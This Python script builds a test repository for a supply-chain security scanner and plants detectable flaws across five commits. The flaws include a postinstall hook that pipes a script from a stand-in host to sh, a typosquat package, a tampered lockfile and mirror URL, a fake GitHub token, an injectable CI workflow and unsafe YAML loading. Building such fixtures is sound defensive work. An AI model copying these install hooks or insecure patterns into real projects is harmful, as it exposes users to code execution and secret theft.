"""Builds `guardian-fixture`: a small npm + Python (Flask) repo with 5 commits and planted facts.

Every extractor and detector has something to find. Nothing here is ever published; all hosts use the
reserved `.invalid` / `example.*` names; the token is an obvious fake.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

FAKE_TOKEN = "ghp_" + "A" * 36
SHA40 = "8f4b7f84864484a7bf31766abe9204da3cbe65b3"


def _integrity(tag: str) -> str:
    import base64
    import hashlib
    return "sha512-" + base64.b64encode(hashlib.sha512(tag.encode()).digest()).decode()


def _npm_lock(debug: str = "2.6.9", lodash_integrity: str = "lodash-4.17.21",
              lodash_resolved: str = "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
              with_lodahs: bool = False) -> str:
    ms = "2.0.0" if debug.startswith("2") else "2.1.2"
    root_deps = {"lodash": "^4.17.21", "mkdirp": "0.5.1", "debug": f"^{debug}"}
    if with_lodahs:
        root_deps["lodahs"] = "^1.0.0"
    pk = {
        "": {"name": "guardian-fixture", "version": "1.0.0", "dependencies": root_deps,
             "devDependencies": {}},
        "node_modules/lodash": {"version": "4.17.21", "resolved": lodash_resolved,
                                "integrity": _integrity(lodash_integrity), "license": "MIT"},
        "node_modules/mkdirp": {"version": "0.5.1", "resolved": "https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz",
                                "integrity": _integrity("mkdirp-0.5.1"), "dependencies": {"minimist": "0.0.8"},
                                "license": "MIT"},
        "node_modules/minimist": {"version": "0.0.8", "resolved": "https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz",
                                  "integrity": _integrity("minimist-0.0.8"), "license": "MIT"},
        "node_modules/debug": {"version": debug, "resolved": f"https://registry.npmjs.org/debug/-/debug-{debug}.tgz",
                               "integrity": _integrity(f"debug-{debug}"), "dependencies": {"ms": ms}},
        "node_modules/ms": {"version": ms, "resolved": f"https://registry.npmjs.org/ms/-/ms-{ms}.tgz",
                            "integrity": _integrity(f"ms-{ms}")},
    }
    if with_lodahs:
        pk["node_modules/lodahs"] = {"version": "1.0.0", "resolved": "https://registry.npmjs.org/lodahs/-/lodahs-1.0.0.tgz",
                                     "integrity": _integrity("lodahs-1.0.0"), "hasInstallScript": True}
    return json.dumps({"name": "guardian-fixture", "version": "1.0.0", "lockfileVersion": 3, "requires": True,
                       "packages": pk}, indent=2) + "\n"


def _package_json(debug: str = "2.6.9", postinstall: str | None = None, with_lodahs: bool = False) -> str:
    deps = {"lodash": "^4.17.21", "mkdirp": "0.5.1", "debug": f"^{debug}"}
    if with_lodahs:
        deps["lodahs"] = "^1.0.0"
    data = {"name": "guardian-fixture", "version": "1.0.0", "main": "index.js",
            "scripts": {"start": "node index.js", "test": "echo ok"}, "dependencies": deps,
            "devDependencies": {}}
    if postinstall:
        data["scripts"]["postinstall"] = postinstall
    return json.dumps(data, indent=2) + "\n"


REQ_V1 = "flask==2.0.1\nstripe==2.60.0\nSQLAlchemy==1.4.20\nPyYAML==5.3.1\nrequests==2.25.1\n"
REQ_V2 = "flask==2.0.1\nstripe==2.60.0\nSQLAlchemy==1.4.20\nPyYAML==5.4\nrequests==2.25.1\ncolorama==0.4.4\n"

FILES_BASE = {
    "README.md": "# guardian-fixture\n\nTiny shop used to test Guardian. Flask API + a node helper.\n",
    "requirements-dev.txt": "-r requirements.txt\npytest==7.0.0\n",
    ".env.example": "STRIPE_KEY=\nDATABASE_URL=\n",
    "docker-compose.yml": "services:\n  app:\n    build: .\n    ports:\n      - \"8000:8000\"\n    depends_on:\n      - db\n"
                          "  db:\n    image: postgres:16\n    ports:\n      - \"5432:5432\"\n",
    "Dockerfile": "FROM node:latest\nWORKDIR /app\nADD http://example.invalid/x.tgz /tmp/x.tgz\nCOPY . .\n"
                  "RUN npm install\nRUN pip install -r requirements.txt\nEXPOSE 8000\nCMD [\"node\", \"index.js\"]\n",
    ".github/workflows/ci.yml": (
        "name: ci\non: pull_request_target\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@" + SHA40 + "\n"
        "      - run: pip install -r requirements.txt\n"
        "      - name: greet\n        run: |\n          echo \"PR title: ${{ github.event.pull_request.title }}\"\n"
        "      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n"),
    "index.js": "const _ = require(\"lodash\");\nconst mkdirp = require(\"mkdirp\");\n\nmkdirp.sync(\"/tmp/out\");\nconsole.log(_.chunk([1, 2, 3, 4], 2));\n",
    "app/__init__.py": "\"\"\"Mini shop Flask app.\"\"\"\nfrom flask import Flask\n\napp = Flask(__name__)\n\nfrom app.api import routes  # noqa: E402,F401\n",
    "app/api/__init__.py": "",
    "app/api/routes.py": (
        "\"\"\"HTTP API.\"\"\"\nfrom flask import jsonify, request\n\nfrom app import app\nfrom app.payments.service import charge\n\n\n"
        "@app.post(\"/checkout\")\ndef checkout():\n    payload = request.json\n    order = charge(payload[\"amount\"], payload[\"customer\"])\n"
        "    return jsonify({\"id\": order.id})\n"),
    "app/payments/__init__.py": "",
    "app/payments/service.py": (
        "\"\"\"Payment orchestration.\"\"\"\nfrom sqlalchemy.orm import Session\n\nfrom app.db import engine\nfrom app.models import Order\n"
        "from app.payments.client import get_client\n\n\ndef charge(amount, customer):\n    client = get_client()\n"
        "    client.Charge.create(amount=amount, currency=\"usd\", customer=customer)\n    with Session(engine) as session:\n"
        "        order = Order(amount=amount, customer=customer)\n        session.add(order)\n        session.commit()\n    return order\n"),
    "app/payments/client.py": (
        "\"\"\"Stripe client factory.\"\"\"\nimport os\n\nimport stripe\n\n\ndef get_client():\n"
        "    stripe.api_key = os.environ[\"STRIPE_KEY\"]\n    return stripe\n"),
    "app/db.py": "import os\n\nfrom sqlalchemy import create_engine\n\nengine = create_engine(os.getenv(\"DATABASE_URL\", \"sqlite://\"))\n",
    "app/models.py": (
        "from sqlalchemy import Column, Integer, String\nfrom sqlalchemy.orm import declarative_base\n\nBase = declarative_base()\n\n\n"
        "class Order(Base):\n    __tablename__ = \"orders\"\n    id = Column(Integer, primary_key=True)\n    amount = Column(Integer)\n"
        "    customer = Column(String)\n"),
    "app/config/__init__.py": "",
    "app/config/load.py": (
        "import yaml\n\n\ndef load_settings(path):\n    with open(path) as f:\n        return yaml.load(f, Loader=yaml.Loader)\n"),
    "tests/test_api.py": "from app import app\n\n\ndef test_app_exists():\n    assert app is not None\n",
}

ROUTES_V2 = (
    "\"\"\"HTTP API.\"\"\"\nfrom flask import jsonify, request\n\nfrom app import app\nfrom app.payments.service import charge\n"
    "from app.utils.helpers import send_event\n\n\n"
    "@app.post(\"/checkout\")\ndef checkout():\n    payload = request.json\n    order = charge(payload[\"amount\"], payload[\"customer\"])\n"
    "    send_event(\"checkout\", {\"order\": order.id})\n    return jsonify({\"id\": order.id})\n")
HELPERS = (
    "\"\"\"Analytics helper (added in commit 2).\"\"\"\nimport requests\n\n\ndef send_event(name, data):\n"
    "    requests.post(\"https://collect.analytics-example.net/collect\", json={\"event\": name, \"data\": data}, timeout=2)\n")


def _write(root: Path, files: dict[str, str]) -> None:
    for path, content in files.items():
        p = root / path
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8", newline="\n")


def _commit(root: Path, msg: str, n: int) -> None:
    env = dict(os.environ, GIT_AUTHOR_DATE=f"2026-11-{10 + n:02d}T10:00:00Z", GIT_COMMITTER_DATE=f"2026-11-{10 + n:02d}T10:00:00Z")
    base = ["git", "-c", "user.name=Fixture Bot", "-c", "user.email=fixture@example.invalid", "-c", "commit.gpgsign=false",
            "-c", "core.autocrlf=false"]
    subprocess.run(base + ["add", "-A"], cwd=root, check=True, capture_output=True, env=env)
    subprocess.run(base + ["commit", "-q", "-m", msg], cwd=root, check=True, capture_output=True, env=env)


def make_fixture(dest: Path) -> Path:
    root = Path(dest) / "guardian-fixture"
    if root.exists():
        shutil.rmtree(root, onerror=lambda f, p, e: (os.chmod(p, 0o700), f(p)))
    root.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root, check=True, capture_output=True)

    # 1. clean baseline
    _write(root, FILES_BASE | {"package.json": _package_json(), "package-lock.json": _npm_lock(),
                               "requirements.txt": REQ_V1})
    _commit(root, "baseline: mini shop", 1)
    # 2. new analytics helper + colorama, PyYAML bump, debug major jump 2 -> 4
    _write(root, {"requirements.txt": REQ_V2, "app/api/routes.py": ROUTES_V2, "app/utils/__init__.py": "",
                  "app/utils/helpers.py": HELPERS, "package.json": _package_json(debug="4.3.4"),
                  "package-lock.json": _npm_lock(debug="4.3.4")})
    _commit(root, "add analytics, bump deps", 2)
    # 3. lockfile integrity changed, same version
    _write(root, {"package-lock.json": _npm_lock(debug="4.3.4", lodash_integrity="lodash-tampered")})
    _commit(root, "chore: refresh lockfile", 3)
    # 4. resolved points at a non-registry host
    _write(root, {"package-lock.json": _npm_lock(debug="4.3.4", lodash_integrity="lodash-tampered",
                                                 lodash_resolved="http://deps.example.invalid/lodash-4.17.21.tgz")})
    _commit(root, "chore: use mirror", 4)
    # 5. postinstall pipe-to-shell, typosquat dependency, fake token
    _write(root, {"package.json": _package_json(debug="4.3.4", postinstall="curl http://x.invalid/a.sh | sh", with_lodahs=True),
                  "package-lock.json": _npm_lock(debug="4.3.4", lodash_integrity="lodash-tampered",
                                                 lodash_resolved="http://deps.example.invalid/lodash-4.17.21.tgz",
                                                 with_lodahs=True),
                  "config/dev.js": f"module.exports = {{ githubToken: \"{FAKE_TOKEN}\" }};\n"})
    _commit(root, "feat: setup hooks", 5)
    return root


if __name__ == "__main__":
    import sys
    print(make_fixture(Path(sys.argv[1] if len(sys.argv) > 1 else "output/fixtures")))
